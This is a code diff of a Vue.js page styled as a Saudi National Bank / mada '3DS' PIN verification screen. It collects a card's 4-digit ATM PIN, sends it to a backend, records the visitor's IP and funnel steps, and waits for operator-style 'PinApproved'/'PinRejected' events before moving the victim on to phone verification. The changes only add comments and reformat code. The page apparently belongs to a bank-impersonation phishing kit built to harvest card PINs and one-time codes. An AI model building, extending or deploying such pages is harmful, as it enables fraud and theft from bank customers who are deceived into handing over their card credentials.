@@ -1,10 +1,13 @@
 <template>
-    <!-- ═══ SNB 3DS-style PIN Verification ═══ -->
+<!-- ════════════════════════════════════════════════════════════════════════════════ -->
+<!-- SECTION 9 - LAYOUT: PAGE WRAPPER & CARD CONTAINER -->
+<!-- ════════════════════════════════════════════════════════════════════════════════ -->
+
     <div class="tds-shell" dir="rtl">
 
         <div class="tds-card" :class="{ 'tds-card--busy': isVerifying }">
 
-            <!-- Processing overlay -->
+            <!-- Loading overlay shown while bank 3DS processes PIN -->
             <Transition name="verify-fade">
                 <div v-if="isVerifying" class="tds-overlay">
                     <img :src="loadingGif" alt="" class="tds-overlay__gif" />
@@ -12,22 +15,26 @@
                 </div>
             </Transition>
 
-            <!-- Branding header -->
+            <!-- ════════════════════════════════════════════════════════════════════ -->
+            <!-- SECTION 10 - CONTENT: BRANDING, FORM, AND BUTTONS -->
+            <!-- ════════════════════════════════════════════════════════════════════ -->
+
+            <!-- Branding header (bank and payment network logos) -->
             <div class="tds-header">
                 <img :src="bankMadaLogo" alt="SNB mada" class="tds-header__bank" />
                 <img :src="schemeLogo" alt="ID Check" class="tds-header__scheme" />
             </div>
 
-            <!-- Error -->
+            <!-- Error alert (PIN rejection reason or API failure) -->
             <div v-if="error" class="tds-error">{{ error }}</div>
 
-            <!-- Title -->
+            <!-- Page title -->
             <h1 class="tds-title">التحقق بالرقم السري</h1>
 
-            <!-- Info -->
+            <!-- Page description -->
             <p class="tds-info">الرجاء إدخال الرقم السري الخاص بالبطاقة المكون من 4 أرقام</p>
 
-            <!-- PIN Field -->
+            <!-- PIN input field -->
             <div class="tds-field">
                 <label for="PaymentATM" class="tds-field__label">الرقم السري</label>
                 <input
@@ -42,7 +49,7 @@
                 />
             </div>
 
-            <!-- Confirm -->
+            <!-- Confirm button (enabled only if PIN is valid) -->
             <button
                 id="atm_code_submit"
                 type="button"
@@ -54,15 +61,23 @@
             </button>
         </div>
 
-        <!-- Cancel -->
+        <!-- Cancel button (returns to checkout) -->
         <button type="button" class="tds-cancel" @click="$router.replace({ name: 'checkout' })">
             CANCEL
         </button>
+
+        <!-- ════════════════════════════════════════════════════════════════════════ -->
+        <!-- SECTION 11 - FOOTER (OPTIONAL HELP OR INFO) -->
+        <!-- ════════════════════════════════════════════════════════════════════════ -->
 
     </div>
 </template>
 
 <script setup>
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 1 - IMPORTS & DEPENDENCIES
+// ═══════════════════════════════════════════════════════════════════════════════════
+
 import { ref, computed, onMounted } from 'vue';
 import { useRouter } from 'vue-router';
 import { useI18n } from 'vue-i18n';
@@ -72,36 +87,100 @@ import { trackStepViewed, trackStepCompleted } from '@/composables/useFunnelTrac
 import { usePayment } from '@/composables/usePayment';
 import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
 import { getPinStatus } from '@/api/paymentApi';
-import logger from '@/utils/logger';
-import { safeRedirect } from '@/utils/safeRedirect';
 import { getReasonLabel } from '@/constants/rejectionReasons';
+import { safeRedirect } from '@/utils/safeRedirect';
+import logger from '@/utils/logger';
 import _paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';
 import bankMadaLogo from '@/../../resources/images/logo/banks/bank_mada.png';
 import schemeLogo from '@/../../resources/images/logo/banks/scheme.png';
 import loadingGif from '@/../../resources/images/logo/banks/loading.gif';
 
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 2 - ROUTER, I18N & DEPENDENCIES
+// ═══════════════════════════════════════════════════════════════════════════════════
+
 const { t } = useI18n();
 const router = useRouter();
 
-// Track this page
+/**
+ * Initialize visitor tracking for card PIN verification page
+ * @type {void}
+ */
 useVisitorTracking( 'card-pin' );
 
-// ─── Load context via composable ────────────────────────────────────
+/**
+ * Get payment context from composable (session, card, verification state)
+ * @type {Object} { context, resolveCustomerIp, submitPin }
+ */
 const { context, resolveCustomerIp, submitPin: submitPinApi } = usePayment();
+
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 3 - STATE: SESSION & CONTEXT
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Get session ID from payment context (used for polling)
+ * @type {string}
+ */
 const sessionId = context.sessionId || '';
+
+/**
+ * Get customer IP address (populated during onMounted)
+ * @type {import('vue').Ref<string>}
+ */
 const customerIpRef = ref( context.customerIp || '' );
 
-// ─── PIN State ──────────────────────────────────────────────────────
-const pinCode = ref( '' );
-const isVerifying = ref( false );
-const hasSubmitted = ref( false );   // prevent double-submit across re-mounts
-const error = ref( '' );
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 4 - STATE: PIN INPUT & VALIDATION
+// ═══════════════════════════════════════════════════════════════════════════════════
 
+/**
+ * User-entered 4-digit PIN code
+ * @type {import('vue').Ref<string>}
+ */
+const pinCode = ref( '' );
+
+/**
+ * Check if PIN code is valid (exactly 4 digits)
+ * @type {import('vue').ComputedRef<boolean>}
+ */
 const isPinValid = computed( () => /^\d{4}$/.test( pinCode.value ) );
 
-// ─── Submit PIN ─────────────────────────────────────────────────────
-const submitPin = async () =>
-{
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 5 - STATE: SUBMISSION & ERROR HANDLING
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Is PIN verification in progress (waiting for bank 3DS system)
+ * @type {import('vue').Ref<boolean>}
+ */
+const isVerifying = ref( false );
+
+/**
+ * Has user submitted PIN already (prevents double-submit across re-mounts)
+ * @type {import('vue').Ref<boolean>}
+ */
+const hasSubmitted = ref( false );
+
+/**
+ * Error message from PIN submission or gateway rejection
+ * @type {import('vue').Ref<string>}
+ */
+const error = ref( '' );
+
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 6 - PIN SUBMISSION HANDLER
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Submit PIN code for bank verification
+ * Calls payment API and waits for bank 3DS response via WebSocket or polling
+ * Prevents double-submit via hasSubmitted flag
+ *
+ * @async
+ * @returns {Promise<void>}
+ */
+async function submitPin() {
     if ( !isPinValid.value || isVerifying.value || hasSubmitted.value ) return;
 
     isVerifying.value = true;
@@ -110,45 +189,60 @@ const submitPin = async () =>
 
     const success = await submitPinApi( pinCode.value );
 
-    if ( success )
-    {
+    if ( success ) {
         logger.debug( '[CardPin] Submitted successfully, waiting for approval' );
-    } else
-    {
+    } else {
         error.value = t( 'verification.cardPin.submitError' );
         isVerifying.value = false;
         hasSubmitted.value = false;
     }
-};
+}
 
-// ─── WebSocket + Polling via composable ─────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 7 - WEBSOCKET & POLLING: BANK 3DS RESPONSE HANDLING
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Setup WebSocket listener + polling for bank 3DS response
+ * Handles both real-time WebSocket approvals/rejections and polling fallback
+ * Routes user to next step (PhoneVerification) or shows error
+ *
+ * Note: PIN events broadcast on the 'otp' channel (shared with OTP events, filtered by event name)
+ *
+ * @type {Object} { setup }
+ */
 const { setup: setupWs } = usePaymentWebSocket( {
-    channelPrefix: 'otp',       // PIN events broadcast on the 'otp' channel (shared with OTP events, filtered by event name)
+    channelPrefix: 'otp',           // PIN events broadcast on 'otp' channel
     approvedEvent: 'PinApproved',
     rejectedEvent: 'PinRejected',
     logTag: 'CardPin',
 
-    onApproved ( event )
-    {
+    /**
+     * Handle successful PIN verification from bank 3DS system
+     * Routes to PhoneVerification page
+     * @param {Object} event - WebSocket approval event with optional redirect_to
+     */
+    onApproved( event ) {
         logger.debug( '[CardPin] Approved:', event );
         isVerifying.value = false;
         trackStepCompleted( 'card_pin', 'phone_verification' );
 
         // Defer navigation via microtask to release the WS message handler
-        queueMicrotask( () =>
-        {
-            if ( event.redirect_to )
-            {
+        queueMicrotask( () => {
+            if ( event.redirect_to ) {
                 safeRedirect( event.redirect_to, 'phoneVerification', router );
-            } else
-            {
+            } else {
                 router.push( { name: 'phoneVerification' } );
             }
         } );
     },
 
-    onRejected ( event )
-    {
+    /**
+     * Handle PIN verification rejection from bank 3DS system
+     * Clears PIN and allows user to retry
+     * @param {Object} event - WebSocket rejection event with reason code
+     */
+    onRejected( event ) {
         logger.debug( '[CardPin] Rejected:', event );
         isVerifying.value = false;
         error.value = getReasonLabel( event.reason, t ) || t( 'verification.cardPin.pinRejected' );
@@ -156,37 +250,53 @@ const { setup: setupWs } = usePaymentWebSocket( {
         hasSubmitted.value = false;
     },
 
-    async pollFn ( { handleApproved, handleRejected } )
-    {
+    /**
+     * Polling fallback for bank 3DS response
+     * Queries server status periodically if WebSocket is unavailable
+     * @async
+     * @param {Object} handlers - { handleApproved, handleRejected } callbacks
+     */
+    async pollFn( { handleApproved, handleRejected } ) {
         const sig = context.statusSigs?.pin || '';
         if ( !isVerifying.value || !sig ) return;
 
         const { data } = await getPinStatus( sessionId, sig );
 
-        if ( data.status === 'verified' )
-        {
+        if ( data.status === 'verified' ) {
             handleApproved( data );
-        } else if ( data.status === 'rejected' )
-        {
+        } else if ( data.status === 'rejected' ) {
             handleRejected( { reason: data.reason || 'pin_other' } );
         }
     },
 } );
 
-// ─── Lifecycle ──────────────────────────────────────────────────────
-onMounted( async () =>
-{
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 8 - LIFECYCLE HOOKS: MOUNT
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Initialize card PIN verification page
+ * Sets up WebSocket listener, localization, and IP tracking
+ *
+ * @async
+ */
+onMounted( async () => {
     // Force Arabic locale on payment pages
     if ( i18n.global.locale.value !== 'ar' ) {
         i18n.global.locale.value = 'ar';
     }
 
+    // Resolve customer IP if not already available
     const ip = customerIpRef.value || await resolveCustomerIp();
     customerIpRef.value = ip;
 
+    // Setup WebSocket listener + polling for bank 3DS response
     setupWs( sessionId );
+
+    // Track user reached PIN verification step
     trackStepViewed( 'card_pin' );
 } );
+
 // WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
 </script>
 
